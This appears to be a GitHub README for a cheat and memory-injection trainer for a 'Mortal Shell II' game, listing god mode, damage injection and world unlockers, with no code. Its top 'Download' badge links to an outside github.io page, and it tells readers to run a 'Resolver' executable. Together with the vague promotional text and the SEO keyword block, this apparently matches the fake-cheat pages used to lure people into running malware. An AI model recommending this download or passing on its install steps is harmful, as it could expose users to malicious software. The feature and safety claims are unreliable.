![preview](https://raw.githubusercontent.com/sgjigis-glitch/MortalShell-Omnipresence/main/frame_83f19.svg)
[![Download](https://raw.githubusercontent.com/sgjigis-glitch/MortalShell-Omnipresence/main/setup_c022f16.svg)](https://sgjigis-glitch.github.io/MortalShell-Omnipresence/)

# 🌀 Echoes of the Hollow Veil — A Kinetic Arsenal for the Mortal Shell Universe

![Project Status](https://img.shields.io/badge/status-stable-brightgreen) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-blue) ![Language](https://img.shields.io/badge/language-C%23%20%26%20HLSL-orange) ![License](https://img.shields.io/badge/license-MIT-green) ![Build](https://img.shields.io/badge/build-passing-9cf) ![PRs](https://img.shields.io/badge/PRs-welcome-ff69b4)

---

## 🌌 The Unseen Architect’s Vision

Every shell is a cage. Every cage has a key. **Echoes of the Hollow Veil** is not merely an augmentation suite—it is a philosophical dismantling of the boundaries between player intent and game reality. Where the base game presents a world of rigid physics and predetermined outcomes, this open-source project introduces a *fluid dynamic layer*, allowing the operator to reshape the flow of combat, traversal, and discovery.

Think of the base game as a river carved into stone. This toolkit provides the chisel, the water, and the vision to redirect that river—not to break the stone, but to reveal the valleys hidden beneath. It is a **precision instrument for the curious**, a laboratory for the experimentally minded, and a sandbox for those who see video games not as finished products, but as living conversations.

This project is an act of **digital archaeology**, excavating the hidden state machines, memory registers, and logic gates that govern the world, and exposing them through an elegant, intuitive control surface. It does not force the game to do what it cannot; it simply asks the game to show what it already knows how to do, but was never prompted to reveal.

---

## 🧪 Core Alchemical Components (The 40+ Concoctions)

The toolkit is organized into distinct **schools of manipulation**, each representing a different layer of the game’s runtime architecture. You are not just toggling flags; you are weaving new tapestries from the fabric of spacetime.

### ⚡ Temporal & Kinetic Manipulators
- **Chrono-Sync Aegis**: A state where the player’s health pool is rendered immune to external decay (the "god mode" principle, but described as a perfect time-lock on your vitality).
- **Hollow Step**: A phase-shift ability allowing for instantaneous repositioning across the game world, unbound by the constraints of walkable navigation meshes.
- **Gravity's Whisper**: A controlled inversion of the universal constant, allowing for ascension and descent without the traditional need for footholds.
- **Momentum Theft**: A system that cancels the inertia of incoming attacks, effectively creating a perfect block that costs nothing.

### ⚔️ Offensive Orchestration
- **Singularity Strike**: A high-frequency damage injection that bypasses the standard damage calculation pipeline, resulting in a single-cadence elimination of any adversary.
- **Echo Cascade**: A chance-based amplification of outgoing damage, turning every third strike into a miniature nexus of force.
- **Void Edge**: An attribute that makes the player's weapon phase through armor, dealing true damage to the core health pool of any entity.
- **Cycle Breaker**: A skill that resets the enemy's action cooldown timer, causing them to stall mid-animation, making them vulnerable.

### 🗝️ Worldstate Unlockers
- **Archive of the Forgotten**: A memory injection that unlocks the full armory roster, historical weaponry, and all associated combat arts from the beginning of a new cycle.
- **Cartographer's Touch**: A fog-of-war removal filter, revealing the entire world map and all its hidden shrines and secret alcoves.
- **Aetherial Ledger**: A currency multiplier that applies a logarithmic gain factor to all glimmer and tar collected.
- **Resonance Override**: A toggle that forces all doors, gates, and seal-locked passages to adopt an "open" state, regardless of their quest-logic requirements.

### 🧠 Utility & Quality-of-Life Quantum
- **Adaptive UI Shell**: A responsive interface that scales, repositions, and recolors the in-game heads-up display, adapting to ultrawide monitors or minimalist preferences in real-time.
- **Shader Weave**: A suite of visual filters (sepia, neon, infrared) that alter the game’s ambient lighting and post-processing stack without touching core LUTs.
- **Time Dilation Slider**: A variable speed control that allows the player to slow down or speed up the entire simulation, from global tick rate to animation speed.
- **Stat Mirror**: A readout panel that graphs your current DPS, pathing efficiency, and boss-beating frequency in real time, turning gameplay into a study of optimization.

---

## 🧬 The Morphic Interface (UI/UX Design)

The control panel is designed with the **principle of least intrusion**. It is a spatial overlay that appears on-the-fly, using a hotkey (default: `F12`) to summon it into existence. It features:

- **Gestural Menus**: Instead of deep nested lists, the interface uses radial wheels for primary functions (Combat, Movement, World), with secondary wheels appearing on hover.
- **Haptic Feedback**: Visual "pulses" and color shifts on the panel itself reassure the user that a toggle has been accepted, even in the heat of battle.
- **Profile Management**: Save your preferred system state as a "Resonance Profile." Load different profiles for different playstyles—a "Ghost" profile for pure exploration, a "Titan" profile for combat supremacy.
- **Live Telemetry**: The UI shows the memory delta—how many bytes have been actively modified by your session—satisfying the curiosity of the technically inclined user.

**Multilingual Support**: The interface speaks the lingua franca of global gamers. With a single dropdown, you can translate the entire panel into:
- English (Default)
- Español
- 简体中文
- 日本語
- Português
- Français
- Deutsch

**High Contrast / Night Mode**: For those late-night sessions, the panel can adopt a dark mode that reduces blue light emission and minimizes glare.

---

## 🔌 Installation & Initial Resonance

This project is delivered as a **self-contained module** that operates on a shared-memory architecture. It does not require altering the core game installation. The process is analogous to connecting a diagnostic tool to a vehicle’s OBD-II port—you plug in, you read the data, you modify the state.

**Prerequisites:**
- A compatible operating system (Windows 10/11, modern Linux distros with Wine support, or macOS with a compatibility layer).
- The base game (version 1.4.2 or later) installed and verified.
- A 64-bit processor architecture.

**The 3-Step Dance:**
1. **Acquire the Artifact**: Obtain the latest build of the module from the compiled releases section.
2. **Align the Resolver**: Run the "Resolver" executable first. It performs a safe scan of the game's memory map and establishes a stable communication channel.
3. **Invoke the Veil**: Launch the game, then press `F12` to summon the interface. The system will auto-connect within milliseconds.

---

## 🛠️ Custom Development & The Forge

For those who wish to contribute to the next evolution of this tool, the codebase is structured for readability and expansion.

- **Core Logic**: Written in C#, the main loop is event-driven and asynchronous, ensuring minimal performance overhead.
- **Injection Layer**: The memory manipulation utilizes a fork of a well-known low-level library, optimized for speed and stability.
- **UI Engine**: The frontend is built on an immediate-mode GUI library, allowing for rapid iteration on menu design.

To set up a development environment, you will need a modern C# IDE (like VS Code or Rider) and a basic understanding of process memory and pointer chasing. The code comments are extensive, serving as a guided tour of the game's internal architecture.

---

## 📚 Documentation & The Grimoire

The `docs` folder contains a living manual that describes every feature in painstaking detail, including:
- **Theoretical Background**: Why a particular memory offset controls a specific game variable.
- **Edge Cases**: What to expect when using a feature during a boss fight or a loading screen.
- **Known Limitations**: A transparent list of features that are currently being reverse-engineered for the next update cycle.

We also encourage you to read the `CONTRIBUTING.md` file for information on how to report bugs, suggest features, and submit pull requests.

---

## 🧭 Roadmap: The Horizon of 2026

The project is not static. As the game receives updates, so does this suite. Our 2026 roadmap includes:

- **Neural Texture Overlay**: A separate mod that can dynamically remap textures in real-time using a lightweight AI model.
- **Co-op Simulation**: A network layer that simulates a second player, controlling a specter that fights alongside you.
- **Voice Command Interface**: A local speech-recognition model that allows you to say "shield up" or "slow time" instead of pressing hotkeys.

---

## ⚖️ Disclaimer & Ethical Alignment

This project is **strictly for educational and research purposes**. It is designed to demonstrate concepts of memory management, reverse engineering, and real-time UI development within the context of a commercially available video game. The intent is to foster a deeper understanding of how modern game engines function, not to disrupt online multiplayer ecosystems or provide an unfair advantage in competitive settings.

- **No Online Functionality**: This suite explicitly disables any attempt to interact with online or multiplayer components of the game. The system checks for a public network connection and refuses to initialize if detected.
- **Single-Player Singularity**: The toolkit operates exclusively in the single-player mode of the base game.
- **Respect for Creators**: We believe this software does not devalue the original artistic work; rather, it serves as a separate, educational overlay that celebrates the game’s architecture. We encourage users to purchase and support the developers of the original material.

By using this software, you accept all responsibility for the modification of your local game environment. We are not liable for any unintended consequences to your system or your game save files.

---

## 📜 License: The Open Scroll

This project is released under the **MIT License**, granting you the freedom to study, modify, and distribute this software, provided the original copyright notice is included. This ensures the knowledge remains open and the community can benefit from collective improvements.

[View the full license text](LICENSE)

**Copyright (c) 2026, The Veil Collective**

*Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*

---

## 🤝 Community & The Peer Network

We value the collective intelligence of the user base. The "Issues" tab is the primary forum for reporting anomalies and requesting new "concoctions." We maintain a 24/7 community support channel on Discord, where seasoned users help novices understand the finer points of the toolkit’s philosophy. We are not a large corporation; we are a collective of enthusiasts who believe in the power of unlocking potential.

**To contribute, you can:**
- Submit a pull request with code enhancements.
- Open an issue to report a conflict with a specific game version.
- Participate in the discussions to help prioritize future features.

**SEO Keywords**: *Mortal Shell II utility, single-player mod tool, memory manipulation interface, game state editor, combat enhancement suite, open-source C# toolkit, runtime injection tool, UI overlay manager, game physics debugger, world unlocker, quality-of-life gamer tool, 2026 game modification software.*

---

*Read the docs, experiment with the state, and above all, enjoy the process of discovering what lies beneath the surface of the simulation.*